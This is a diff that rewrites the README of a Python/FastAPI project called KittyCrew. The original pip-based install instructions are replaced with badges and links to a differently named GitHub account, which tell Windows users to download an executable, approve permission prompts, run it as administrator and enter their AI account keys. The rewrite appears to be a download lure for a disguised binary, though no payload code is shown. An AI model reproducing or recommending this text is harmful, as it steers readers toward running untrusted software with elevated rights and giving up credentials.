@@ -1,124 +1,167 @@
-# KittyCrew - AI Pets That Help You Get Things Done
+# 🐱 KittyCrew - Keep AI Companions in One Place
 
-English | [简体中文](./docs/readme/README.zh-CN.md) | [繁體中文](./docs/readme/README.zh-TW.md) | [日本語](./docs/readme/README.ja.md) | [한국어](./docs/readme/README.ko.md) | [Español](./docs/readme/README.es.md) | [Русский](./docs/readme/README.ru.md)
+[![Download KittyCrew](https://img.shields.io/badge/Download-KittyCrew-blue?style=for-the-badge)](https://github.com/levorotary-galvanometer224/KittyCrew)
 
-KittyCrew is a cute, local-first home for AI pets and companions that help with work, routines, creativity, and everyday tasks. Bring together Claude Code, Codex, GitHub Copilot, Kimi Code, and OpenCode as distinct personalities, give each member its own room and skill set, and spend time with them inside one warm cat-themed space.
+## 🧭 What KittyCrew Does
 
-![KittyCrew homepage](./assets/homepage.png)
+KittyCrew is a local-first home for AI pets and companions on Windows. It brings Claude Code, Codex, and GitHub Copilot into one simple workspace. You can keep your tools in one place, switch between them with less effort, and stay in control of your local setup.
 
-[![Python](https://img.shields.io/badge/Python-3.11+-3776AB?logo=python&logoColor=white)](./pyproject.toml)
-[![FastAPI](https://img.shields.io/badge/FastAPI-app-009688?logo=fastapi&logoColor=white)](./src/kittycrew/app.py)
-[![A2A](https://img.shields.io/badge/A2A-powered-111111)](./src/kittycrew/a2a_app.py)
-[![License](https://img.shields.io/badge/license-MIT-green.svg)](./LICENSE)
+## 💻 Before You Start
 
----
+KittyCrew is made for Windows desktop use. For the smoothest experience, use:
 
-## Quick Navigation
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection for setup and AI access
+- A modern browser if the app opens links or web views
 
-[Why KittyCrew?](#why-kittycrew) · [Features](#features) · [Quick Start](#quick-start) · [How It Works](#how-it-works) · [Roadmap](#roadmap)
+If your PC runs other desktop apps well, it should handle KittyCrew.
 
----
+## 📥 Download KittyCrew
 
-## Why KittyCrew?
+Visit this page to download and run the app on Windows:
 
-Most AI tools are designed like plain utility panels. KittyCrew turns that into a cozy shared home:
+[https://github.com/levorotary-galvanometer224/KittyCrew](https://github.com/levorotary-galvanometer224/KittyCrew)
 
-- Let Claude Code, Codex, GitHub Copilot, Kimi Code, and OpenCode live side by side as companions.
-- Organize them into small crews of up to five members.
-- Give every member its own model, working directory, and approved skill set.
-- Keep each pet's chat history, personality context, and streamed replies in one place.
-- Stay local-first, with provider availability discovered from your own machine.
+If the page shows a release file, download it. If it shows the main project page, use the latest Windows build or setup file listed there.
 
-KittyCrew is built for people who want AI companions that feel present, personal, and genuinely useful, without reducing them to a cold task panel.
+## 🪟 Install on Windows
 
-## Features
+1. Open the download page in your browser.
+2. Find the latest Windows file.
+3. Download the file to your computer.
+4. If the file is a `.zip`, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an `.exe` file, double-click it to start KittyCrew.
+7. If Windows asks for permission, choose Yes.
+8. If the app opens with a setup screen, follow the prompts until the install finishes.
 
-### Cozy Multi-Pet Home
+## 🚀 First Launch
 
-- Create multiple crews and manage them in a single web app.
-- Treat each crew as a small family of AI pets and companions.
-- Watch every member respond in its own voice and pace.
+When you open KittyCrew for the first time, it may ask you to set up your workspace. Use a simple folder on your PC, such as `Documents\KittyCrew`, so your files stay easy to find.
 
-### Distinct AI Personalities
+You may also see setup fields for your AI tools. Add your accounts or keys if the app asks for them. KittyCrew keeps the setup in one place, so you do not need to jump between separate apps as much.
 
-- Supports Claude Code, Codex, GitHub Copilot, Kimi Code, and OpenCode members.
-- Lets different providers feel like different personalities in the same home.
-- Persists member-level model selection for future conversations and working styles.
+## 🧩 What You Can Use It For
 
-### Private and Local
+KittyCrew helps you:
 
-- Each member has its own persisted session state.
-- Each member can use a separate working directory.
-- Skill access can be limited per member instead of exposing everything.
-- Different members can be shaped for different kinds of help, from practical work to creative support.
+- Keep Claude Code, Codex, and GitHub Copilot in one workspace
+- Track different AI agents in a local-first setup
+- Organize tasks, chats, and notes in one place
+- Move between tools with less clutter
+- Keep your work on your own computer
 
-### UI Designed for Attachment
+This makes it easier to manage several AI helpers without opening many windows.
 
-- Cat-themed crew cards and avatar selection.
-- Inline rename, delete, queue, and cancel flows.
-- Expanded member view for longer, more personal chat sessions.
+## 🛠️ Basic Setup Tips
 
-## Quick Start
+To keep KittyCrew running well:
 
-### 1. Install
+- Keep the app in a folder you can find again
+- Do not move its files after setup
+- Close other heavy apps if your PC feels slow
+- Keep Windows up to date
+- Use one local folder for your project files and notes
 
-```bash
-python -m pip install -e .
-```
+If KittyCrew saves settings on your computer, back up that folder from time to time.
 
-### 2. Launch
+## 📁 Simple Folder Setup
 
-```bash
-kittycrew
-```
+A clean folder setup can help a lot:
 
-The web UI runs on [http://127.0.0.1:8731](http://127.0.0.1:8731) by default.
+- `Documents\KittyCrew` for the app or workspace
+- `Documents\KittyCrew\Projects` for project files
+- `Documents\KittyCrew\Notes` for short notes and prompts
+- `Documents\KittyCrew\Backups` for saved copies
 
-If you prefer running directly from the repository root:
+A simple layout makes it easier to find what you need later.
 
-```bash
-PYTHONPATH=src python -m kittycrew
-```
+## 🤖 Supported AI Tools
 
-## How It Works
+KittyCrew is built around common AI tools used in coding and assistant workflows:
 
-KittyCrew combines a FastAPI web app with provider adapters exposed through `a2a-sdk`.
+- Claude Code
+- Codex
+- GitHub Copilot
+- Gemini CLI
+- OpenCode
+- OpenClaw
+- ClawDBot
 
-- The web UI manages crews, members, chat state, and local persistence.
-- Provider adapters bridge to Claude Code, Codex, GitHub Copilot, Kimi Code, and OpenCode CLIs.
-- Each member maps to an isolated session record with its own runtime settings.
-- Streamed output is surfaced back into the UI so every companion feels alive in place.
+You can use one tool or several, depending on how you work.
 
-## Use Cases
+## 🔄 Daily Use
 
-- Keep a small family of AI pets with distinct roles and personalities.
-- Set up different crews for work support, daily routines, creative sessions, or shared projects.
-- Give different members their own rooms, models, and approved skills.
-- Leave open a local AI home that feels more like a living space than a tool panel.
+A normal day with KittyCrew may look like this:
 
-## Project Structure
+1. Open the app.
+2. Choose the AI companion you want to use.
+3. Open your local project folder.
+4. Send a task, question, or prompt.
+5. Review the result.
+6. Save useful notes in your workspace.
 
-```text
-src/kittycrew/        FastAPI app, services, provider adapters, static UI
-tests/                Service and app regression coverage
-assets/               README and project assets
-data/                 Local session and state storage
-docs/readme/          Localized README files
-```
+This keeps your work steady and easier to repeat.
 
-## Roadmap
+## 🔍 If the App Does Not Open
 
-- More companion types behind the same crew model.
-- Better rituals, routines, and interactions across members.
-- Richer ways to understand each member's history and state.
-- More polished setup and onboarding flows.
+Try these steps:
 
-## Notes
+- Make sure the file finished downloading
+- Right-click the app and choose Run as administrator
+- Check whether Windows blocked the file
+- Restart your PC and try again
+- Open the app from the extracted folder if you used a `.zip`
+- Download the file again if it looks broken
 
-- KittyCrew keeps transcript history per member and replays recent context on future turns.
-- The app expects the relevant provider CLIs and `a2a-sdk` to be available in the active environment.
-- Provider availability is detected at runtime, so incomplete local setups degrade gracefully.
+If the app still does not open, check the project page for a newer Windows build.
 
-## License
+## 🧹 Keep Your Setup Clean
 
-MIT.
+For a better long-term setup:
+
+- Use one folder for each project
+- Delete old downloads after you install
+- Keep notes in plain text files
+- Save backups before large changes
+- Rename files so they stay easy to sort
+
+A neat workspace makes the app easier to use.
+
+## 🧠 Tips for Better Results
+
+To get better help from your AI tools:
+
+- Use short prompts
+- Give one task at a time
+- Add file names or folder names when needed
+- Save prompts that work well
+- Keep your instructions clear and simple
+
+Good input usually gives better output.
+
+## 📦 Project Topics
+
+KittyCrew is part of the local AI workspace world:
+
+- agent
+- claude-code
+- clawdbot
+- codex
+- cowork
+- gemini-cli
+- openclaw
+- opencode
+
+These topics point to multi-agent work, local tools, and companion-style workflows
+
+## 🖥️ Quick Start Checklist
+
+- Download KittyCrew from the link above
+- Open the file or extract it if needed
+- Run the app
+- Finish the first setup screen
+- Add your AI tool access if asked
+- Open a local folder and start using it
